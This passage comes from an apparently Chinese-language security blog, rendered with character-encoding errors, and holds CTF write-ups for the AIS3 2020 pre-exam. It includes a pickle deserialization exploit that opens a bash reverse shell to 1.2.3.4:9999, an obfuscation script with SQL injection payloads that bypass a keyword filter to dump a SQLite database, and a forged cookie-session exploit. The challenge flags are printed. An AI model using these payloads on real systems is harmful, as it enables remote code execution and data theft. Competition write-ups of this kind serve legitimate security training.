class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    data = request.values.get(<span class="string">'data'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = base64.b64decode(data)</span><br><span class="line">            data = pickle.loads(data)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> data <span class="keyword">and</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">return</span> open(<span class="string">'/flag'</span>).read()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> str(data)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> traceback.format_exc()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br></pre></td></tr></table></figure>
<p>çµ¦ä»– dataï¼Œä»–æœƒ <code>pickle.loads</code>ï¼Œæ²’æœ‰ä»»ä½•æª¢æŸ¥ï¼Œæ‰€ä»¥ç›´æ¥ reverse shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exploit</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span>(os.system, ((<span class="string">'bash -c "bash -i &gt;&amp; /dev/tcp/1.2.3.4/9999 0&gt;&amp;1"'</span>),))</span><br><span class="line"></span><br><span class="line">ex = Exploit()</span><br><span class="line">print(b64decode(pickle.dumps(ex)))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;7h3_5n4k3_w1ll_4lw4y5_b173_b4ck.&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Owl"><a class="header-anchor" href="#Owl"></a>Owl</h3>
<p>é€™é¡Œç¶²ç«™åœ¨ <a href="https://turtowl.ais3.org/%EF%BC%8C%E9%A6%96%E9%A0%81%E6%9C%89%E7%99%BB%E5%85%A5%E9%A0%81%E9%9D%A2%EF%BC%8C%E4%BB%96%E6%9C%89%E5%80%8B%E7%99%BD%E8%89%B2%E5%AD%97%E5%AF%AB">https://turtowl.ais3.org/ï¼Œé¦–é æœ‰ç™»å…¥é é¢ï¼Œä»–æœ‰å€‹ç™½è‰²å­—å¯«</a> <code>GUESS THE STUPID USERNAME / PASSWORD</code>ï¼ŒçŒœ <code>admin/admin</code> å°±ç™»é€²å»äº†ï¼Œç™»é€²å»å¾Œï¼Œåˆæœ‰å€‹ç™½è‰²å­—æŒ‰éˆ•å¯« <code>SHOW HINT</code>ï¼Œé»ä¸‹å»å°±çœ‹åˆ°åŸå§‹ç¢¼äº†</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Settings</span></span><br><span class="line">    ini_set(<span class="string">'display_errors'</span>, <span class="number">1</span>);</span><br><span class="line">    ini_set(<span class="string">'display_startup_errors'</span>, <span class="number">1</span>);</span><br><span class="line">    error_reporting(E_ALL);</span><br><span class="line">    date_default_timezone_set(<span class="string">'Asia/Taipei'</span>);</span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// CSRF</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'csrf_key'</span>]))</span><br><span class="line">        $_SESSION[<span class="string">'csrf_key'</span>] = md5(rand() * rand());</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'csrf.php'</span>);</span><br><span class="line">    $csrf = <span class="keyword">new</span> Csrf($_SESSION[<span class="string">'csrf_key'</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($action = @$_GET[<span class="string">'action'</span>]) &#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">redirect</span><span class="params">($path = <span class="string">'/'</span>, $message = null)</span> </span>&#123;</span><br><span class="line">            $alert = $message ? <span class="string">'alert('</span> . json_encode($message) . <span class="string">')'</span> : <span class="string">''</span>;</span><br><span class="line">            $path = json_encode($path);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"&lt;script&gt;$alert; document.location.replace($path);&lt;/script&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($action === <span class="string">'logout'</span>) &#123;</span><br><span class="line">            <span class="keyword">unset</span>($_SESSION[<span class="string">'user'</span>]);</span><br><span class="line">            redirect(<span class="string">'/'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ($action === <span class="string">'login'</span>) &#123;</span><br><span class="line">            <span class="comment">// Validate CSRF token</span></span><br><span class="line">            $token = @$_POST[<span class="string">'csrf_token'</span>];</span><br><span class="line">            <span class="keyword">if</span> (!$token || !$csrf-&gt;validate($token)) &#123;</span><br><span class="line">                redirect(<span class="string">'/'</span>, <span class="string">'invalid csrf_token'</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check if username and password are given</span></span><br><span class="line">            $username = @$_POST[<span class="string">'username'</span>];</span><br><span class="line">            $password = @$_POST[<span class="string">'password'</span>];</span><br><span class="line">            <span class="keyword">if</span> (!$username || !$password) &#123;</span><br><span class="line">                redirect(<span class="string">'/'</span>, <span class="string">'username and password should not be empty'</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Get rid of sqlmap kiddies</span></span><br><span class="line">            <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>], <span class="string">'sqlmap'</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">                redirect(<span class="string">'/'</span>, <span class="string">"sqlmap is child's play"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Get rid of you</span></span><br><span class="line">            $bad = [<span class="string">' '</span>, <span class="string">'/*'</span>, <span class="string">'*/'</span>, <span class="string">'select'</span>, <span class="string">'union'</span>, <span class="string">'or'</span>, <span class="string">'and'</span>, <span class="string">'where'</span>, <span class="string">'from'</span>, <span class="string">'--'</span>];</span><br><span class="line">            $username = str_ireplace($bad, <span class="string">''</span>, $username);</span><br><span class="line">            $username = str_ireplace($bad, <span class="string">''</span>, $username);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Auth</span></span><br><span class="line">            $hash = md5($password);</span><br><span class="line">            $row = (<span class="keyword">new</span> SQLite3(<span class="string">'/db.sqlite3'</span>))</span><br><span class="line">                -&gt;querySingle(<span class="string">"SELECT * FROM users WHERE username = '$username' AND password = '$hash'"</span>, <span class="keyword">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (!$row) &#123;</span><br><span class="line">                redirect(<span class="string">'/'</span>, <span class="string">'login failed'</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_SESSION[<span class="string">'user'</span>] = $row[<span class="string">'username'</span>];</span><br><span class="line">            redirect(<span class="string">'/'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            redirect(<span class="string">'/'</span>, <span class="string">"unknown action: $action"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $user = @$_SESSION[<span class="string">'user'</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ğŸ¦‰ğŸ¦‰ğŸ¦‰ğŸ¦‰&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">'utf-8'</span>&gt;</span><br><span class="line">    &lt;link href=<span class="string">"//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css"</span> rel=<span class="string">"stylesheet"</span> id=<span class="string">"bootstrap-css"</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">"//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span> (!$user): <span class="meta">?&gt;</span></span><br><span class="line">        &lt;div id=<span class="string">"login"</span>&gt;</span><br><span class="line">            &lt;h3 class="text-center text-white pt-5"&gt;GUESS THE STUPID USERNAME / PASSWORD&lt;/h3&gt;</span><br><span class="line">            &lt;div class="container"&gt;</span><br><span class="line">                &lt;div id="login-row" class="row justify-content-center align-items-center"&gt;</span><br><span class="line">                    &lt;div id="login-column" class="col-md-6"&gt;</span><br><span class="line">                        &lt;div id="login-box" class="col-md-12"&gt;</span><br><span class="line">                            &lt;form id="login-form" class="form" action="?action=login" method="post"&gt;</span><br><span class="line">                                &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"csrf_token"</span> value=<span class="string">"&lt;?= htmlentities($csrf-&gt;generate()) ?&gt;"</span>&gt;</span><br><span class="line">                                &lt;h3 class="text-center text-info"&gt;ğŸ¦‰: "Login to see cool things!"&lt;/h3&gt;</span><br><span class="line">                                &lt;div class="form-group"&gt;</span><br><span class="line">                                    &lt;label for="name" class="text-info"&gt;Username:&lt;/label&gt;&lt;br&gt;</span><br><span class="line">                                    &lt;input type="text" name="username" id="username" class="form-control"&gt;&lt;br&gt;</span><br><span class="line">                                    &lt;label for="name" class="text-info"&gt;Password:&lt;/label&gt;&lt;br&gt;</span><br><span class="line">                                    &lt;input type="text" name="password" id="password" class="form-control"&gt;&lt;br&gt;</span><br><span class="line">                                &lt;/div&gt;</span><br><span class="line">                                &lt;div class="form-group"&gt;</span><br><span class="line">                                    &lt;input type="submit" name="submit" class="btn btn-info btn-md" value="Login"&gt;</span><br><span class="line">                                &lt;/div&gt;</span><br><span class="line">                            &lt;/form&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">else</span>: <span class="meta">?&gt;</span></span><br><span class="line">        &lt;h3 class="text-center text-white pt-5"&gt;&lt;a style="color: white" href="/?source"&gt;SHOW HINT&lt;/a&gt;&lt;/h3&gt;</span><br><span class="line">        &lt;div class="container"&gt;</span><br><span class="line">            &lt;div class="row justify-content-center align-items-center"&gt;</span><br><span class="line">                &lt;div class="col-md-6"&gt;</span><br><span class="line">                    &lt;div class="col-md-12"&gt;</span><br><span class="line">                        &lt;h3 class="text-center text-info"&gt;Nothing&lt;/h3&gt;</span><br><span class="line">                        Hello, &lt;b&gt;<span class="meta">&lt;?</span>= htmlentities($user) <span class="meta">?&gt;</span>&lt;/b&gt;, nothing here.</span><br><span class="line">                        &lt;a href=<span class="string">"?action=logout"</span>&gt;Logout!&lt;/a&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">endif</span> <span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
<p>å°±æ˜¯ sqlite çš„ SQL Injectionï¼Œè¼¸å…¥çš„ username æœƒç”¨ <code>str_ireplace</code> éæ¿¾å…©æ¬¡ï¼Œå¾ˆå¥½ç¹éï¼Œæ‰“ <code>///***</code> å°±æœƒè¢«éæ¿¾æˆ <code>/*</code>ï¼Œæ‰“ <code>selselselectectect</code> å°±æœƒè¢«éæ¿¾æˆ <code>select</code>ï¼Œæ‰€ä»¥å¯«å€‹ç°¡å–®çš„ script è‡ªå‹•è½‰æ› payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">table = &#123;</span><br><span class="line">    <span class="string">' '</span>: <span class="string">'/**/'</span>,</span><br><span class="line">    <span class="string">'/*'</span>: <span class="string">'///***'</span>,</span><br><span class="line">    <span class="string">'*/'</span>: <span class="string">'***///'</span>,</span><br><span class="line">    <span class="string">'union'</span>: <span class="string">'unununionionion'</span>,</span><br><span class="line">    <span class="string">'select'</span>: <span class="string">'selselselectectect'</span>,</span><br><span class="line">    <span class="string">'and'</span>: <span class="string">'anananddd'</span>,</span><br><span class="line">    <span class="string">'or'</span>: <span class="string">'ooorrr'</span>,</span><br><span class="line">    <span class="string">'where'</span>: <span class="string">'whewhewhererere'</span>,</span><br><span class="line">    <span class="string">'from'</span>: <span class="string">'frfrfromomom'</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inp = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> t,v <span class="keyword">in</span> table.items():</span><br><span class="line">    inp = inp.replace(t, v)</span><br><span class="line">print(inp)</span><br></pre></td></tr></table></figure>
<p>æ³¨æ„åˆ° <code>--</code> é‚„æ˜¯æ²’è¾¦æ³•ç”¨ï¼Œå› ç‚º <code>-selselectect-</code> æœƒè¢«è½‰æˆç©ºçš„ï¼Œ<code>select</code> é †åºåœ¨ <code>--</code> å‰é¢æœƒå…ˆè¢«éæ¿¾æ‰ï¼Œ<code>str_ireplace</code> æ˜¯ç…§è‘— list ä¸€å€‹å€‹ replace çš„ï¼Œä¸éæˆ‘å€‘ç”¨ <code>/*</code> å°±è¶³å¤ äº†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;unununionionion&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;selselselectectect&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;null,sql,null&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;frfrfromomom&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;sqlite_master&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;whewhewhererere&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;type&#x3D;&#39;table&#39;&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;limit&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;1&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;offset&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;0&#x2F;&#x2F;&#x2F;***</span><br></pre></td></tr></table></figure>
<p>å…ˆæŒ– tableï¼Œæ‰¾åˆ° <code>CREATE TABLE garbage ( id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, value TEXT )</code>ï¼Œåªæœ‰é€™å€‹ <code>garbage</code> å’Œ <code>users</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;unununionionion&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;selselselectectect&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;null,name,null&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;frfrfromomom&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;garbage&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;limit&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;1&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;offset&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;0&#x2F;&#x2F;&#x2F;***</span><br></pre></td></tr></table></figure>
<p>å†æŒ– db è£¡é¢ï¼ŒæŒ–åˆ°æœ‰å€‹ name æ˜¯ <code>something good</code>ï¼ŒæŒ–ä»–çš„ value å°±çœ‹åˆ° flag äº†</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;4_ch1ld_15_4_curly_d1mpl3d_lun471c&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Rhino"><a class="header-anchor" href="#Rhino"></a>Rhino</h3>
<p>é€™é¡Œç¶²ç«™åœ¨ <a href="https://rhino.ais3.org/%EF%BC%8C">https://rhino.ais3.org/ï¼Œ</a><code>robots.txt</code> å¯ä»¥çœ‹åˆ°æ±è¥¿</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># RIP robots!</span><br><span class="line"></span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;</span><br><span class="line">Disallow: &#x2F;index.html</span><br><span class="line">Disallow: &#x2F;*.xml</span><br><span class="line">Disallow: &#x2F;recent</span><br><span class="line">Disallow: &#x2F;assets</span><br><span class="line">Disallow: &#x2F;about</span><br><span class="line">Disallow: &#x2F;*.js</span><br><span class="line">Disallow: &#x2F;*.json</span><br><span class="line">Disallow: &#x2F;node_modules</span><br><span class="line">Disallow: &#x2F;flag.txt</span><br></pre></td></tr></table></figure>
<p>ç„¶å¾Œé€™å€‹ç¶²ç«™çœ‹èµ·ä¾†æ˜¯ç”¨ express æ¶çš„ç„¶å¾Œæ”¾ jekyll ç”¢çš„ blogï¼Œæ—¢ç„¶æ˜¯ js project å…ˆçœ‹å€‹ <code>package.json</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;app&quot;,</span><br><span class="line">  &quot;version&quot;: &quot;1.0.0&quot;,</span><br><span class="line">  &quot;description&quot;: &quot;&quot;,</span><br><span class="line">  &quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;start&quot;: &quot;node chill.js&quot;,</span><br><span class="line">    &quot;test&quot;: &quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;author&quot;: &quot;djosix&quot;,</span><br><span class="line">  &quot;license&quot;: &quot;ISC&quot;,</span><br><span class="line">  &quot;dependencies&quot;: &#123;</span><br><span class="line">    &quot;cookie-session&quot;: &quot;^1.4.0&quot;,</span><br><span class="line">    &quot;express&quot;: &quot;^4.17.1&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç„¶å¾Œå°±çœ‹åˆ°åŸå§‹ç¢¼å«åš <code>chill.js</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">'cookie-session'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(session(&#123;</span><br><span class="line">  secret: <span class="string">"I'm watching you."</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">app.use(<span class="string">'/'</span>, express.static(<span class="string">'./'</span>));</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/flag.txt'</span>, (req, res) =&gt; &#123;</span><br><span class="line">  res.setHeader(<span class="string">'Content-Type'</span>, <span class="string">'text/plain'</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> n = req.session.magic;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &amp;&amp; (n + <span class="number">420</span>) === <span class="number">420</span>)</span><br><span class="line">    res.sendFile(<span class="string">'/flag'</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    res.send(<span class="string">'you are a sad person too'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'*'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">  res.status(<span class="number">404</span>).sendFile(<span class="string">'404.html'</span>, &#123; <span class="attr">root</span>: __dirname &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(process.env.PORT, <span class="string">'0.0.0.0'</span>);</span><br></pre></td></tr></table></figure>
<p>çœ‹èµ·ä¾†åªè¦è®“ä»–çš„ <code>n &amp;&amp; (n + 420) === 420</code> å°±å¯ä»¥è®€ flag äº†ï¼Œä»¥å‰å°±å¾ˆå¸¸çœ‹åˆ° FB ä¸Šæœ‰äºº po ä¸€äº› js çš„æ¢—åœ–èªªæ˜ js å¾ˆå¤æ€ªçš„è¡Œç‚ºï¼Œéš¨ä¾¿çœ‹äº†å¹¾å¼µè¤‡ç¿’ä¸€ä¸‹ï¼Œå°±æƒ³åˆ°æœ‰æµ®é»æ•¸èª¤å·®çš„å•é¡Œï¼Œæ‰€ä»¥ <code>n</code> è¨­æˆ <code>0.00000000000001</code> å°±å¯ä»¥äº†ï¼Œ<code>n</code> æ˜¯å¾ <code>req.session.magic</code> æŠ“çš„ï¼Œæ‰€ä»¥æˆ‘å€‘è¦è¨­ <code>req.session.magic</code> çš„è©±ï¼Œæœ€ç°¡å–®çš„æ–¹å¼å°±æ˜¯è‡ªå·±æŠŠ server æ¶èµ·ä¾†ï¼Œç„¶å¾Œå¤šåŠ ä¸€è¡Œ <code>req.session.magic = 0.00000000000001</code>ï¼Œå°±å¯ä»¥ç”¢å‡º <code>express:sess</code> å’Œ <code>express:sess.sig</code> å…©å€‹ Cookie äº†ï¼Œsig æ˜¯ç”¨å‰é¢è¨­å®šçš„ <code>secret: &quot;I'm watching you.&quot;</code> ç®—å‡ºä¾†çš„ï¼Œè©³æƒ…å¯ä»¥çœ‹ <a href="https://www.npmjs.com/package/cookie-session">cookie-session</a>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;h4v3_y0u_r34d_7h3_rh1n0_b00k?&#125;</span><br></pre></td></tr></table></figure>

        </div>
        
        
        <div class="level is-mobile readmore-button">
            <div class="level-start">
                <div class="level-item">
                <a class="button is-size-7 is-light" href="/2020/06/09/security/writeups/ais3-2020-preexam/#more">Read More</a>
                </div>
            </div>
        </div>
        
        
    </div>
</div>








    
<div class="card card-readmore">
    
    <div class="card-content article ">
        
        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
            <div class="level-left">
                <time class="level-item has-text-grey" datetime="2020-05-04T06:33:13.000Z">2020-05-04</time>
                
                <div class="level-item">
                <a class="has-link-grey -link" href="/categories/security/">security</a>&nbsp;/&nbsp;<a class="has-link-grey -link" href="/categories/security/writeups/">writeups</a>
                </div>
                
                
                <span class="level-item has-text-grey">
                    
                    
                    7 minutes read (About 1004 words)
                </span>
                
                
            </div>
        </div>
        
        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
            
                <a class="has-link-black-ter" href="/2020/05/04/security/writeups/f-hash/">ã€Writeupsã€‘VolgaCTF Quals 2020 - F-Hash</a>
            
        </h1>
        <div class="content">
